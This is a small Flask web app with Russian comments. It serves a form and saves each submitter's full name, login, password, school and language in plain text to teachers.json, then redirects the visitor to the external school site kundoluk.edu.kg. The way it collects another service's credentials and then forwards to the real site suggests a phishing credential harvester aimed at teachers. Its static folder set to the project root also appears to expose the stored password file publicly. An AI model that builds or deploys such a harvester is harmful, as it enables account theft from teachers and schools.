from flask import Flask, render_template, request, redirect
import json
import os
from datetime import datetime

# Инициализируем Flask так, чтобы шаблоны и статика находились в корне проекта
app = Flask(
    __name__,
    template_folder='.',  # шаблоны рядом с app.py
    static_folder='.'     # статика (CSS/JS) — тоже в корне
)

DATA_FILE = 'teachers.json'


def load_data():
    if not os.path.exists(DATA_FILE):
        return []
    try:
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
            return data if isinstance(data, list) else []
    except json.JSONDecodeError:
        return []


def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

# GET / — отдать форму
@app.route('/', methods=['GET'])
def index():
    return render_template('Adelina.html')

# POST /confirm — обработать форму
@app.route('/confirm', methods=['POST'])
def confirm():
    entry = {
        "fio":      request.form.get('fio'),
        "login":    request.form.get('login'),
        "password": request.form.get('password'),
        "school":   request.form.get('school'),
        "language": request.form.get('language'),
        "agreed":   bool(request.form.get('agree')),
        "ts":       datetime.utcnow().isoformat()
    }
    data = load_data()
    data.append(entry)
    save_data(data)
    # редиректим на внешний сайт после сохранения
    return redirect("https://kundoluk.edu.kg/")

if __name__ == '__main__':
    # для продакшена используйте WSGI-сервер (gunicorn). Здесь для локального запуска
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
